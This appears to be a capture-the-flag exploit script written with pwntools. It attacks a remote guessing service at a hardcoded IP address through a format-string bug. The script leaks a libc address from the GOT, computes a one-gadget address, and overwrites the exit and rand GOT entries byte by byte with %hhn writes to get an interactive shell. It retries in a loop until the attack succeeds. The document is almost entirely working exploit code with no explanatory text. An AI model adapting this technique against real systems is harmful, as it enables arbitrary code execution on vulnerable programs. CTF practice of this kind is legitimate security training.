from pwn import *
context.log_level = 'debug'
# p = process("./pwn")
libc = ELF("/libc64.so.6")
# p = remote("47.97.253.115", "10003")
e = ELF("./pwn")
while 1:
    try:
        p = remote("47.97.253.115", "10003")
        p.recvuntil("enter:")
        p.sendline("1")
        p.recvuntil("guess?: ")
        payload = "%12$s%14$hhn%3c%13$hhn".ljust(4 * 8, '1') + p64(
            e.got['puts']) + p64(e.got['exit'] + 1) + p64(e.got['exit'])
        p.sendline(payload)
        libc_puts = u64(p.recv(6) + '\x00\x00')
        libc_base = libc_puts - libc.symbols['puts']

        print "libc: " + hex(libc_base)
        one_gadget_libc = libc_base + 0x45216
        print "one gadget:" + hex(one_gadget_libc)
        print "puts:" + hex(libc_puts)
        p.recvuntil("enter:")
        p.sendline("1")
        p.recvuntil("guess?: ", timeout=1)
        a1 = (one_gadget_libc & 0xff0000) >> 16
        a2 = (one_gadget_libc & 0xff00) >> 8
        a3 = one_gadget_libc & 0xff
        print hex(a1) + hex(a2) + hex(a3)
        point1 = [2, a1]
        point2 = [1, a2]
        point3 = [0, a3]

        def swap(p1, p2):
            for i in range(2):
                t = p1[i]
                p1[i] = p2[i]
                p2[i] = t

        if a1 > a2:
            swap(point1, point2)
        if a1 > a3:
            swap(point1, point3)
        if a2 > a3:
            swap(point2, point3)
        print point1 + point2 + point3

        point2[1] = point2[1] - point1[1]
        point3[1] = point3[1] - point2[1] - point1[1]
        print point1 + point2 + point3

        write_got_payload = '%' + str(point1[1]) + 'c' + '%14$hhn'
        write_got_payload += '%' + str(point2[1]) + 'c' + '%15$hhn'
        write_got_payload += '%' + str(point3[1]) + 'c' + '%16$hhn'
        write_got_payload = write_got_payload.ljust(48, 'a')
        write_got_payload += p64(e.got['rand'] + point1[0])
        write_got_payload += p64(e.got['rand'] + point2[0])
        write_got_payload += p64(e.got['rand'] + point3[0])
        p.sendline(write_got_payload)
        # p.recvall(timeout=1)
        p.interactive()
    except:
        p.close()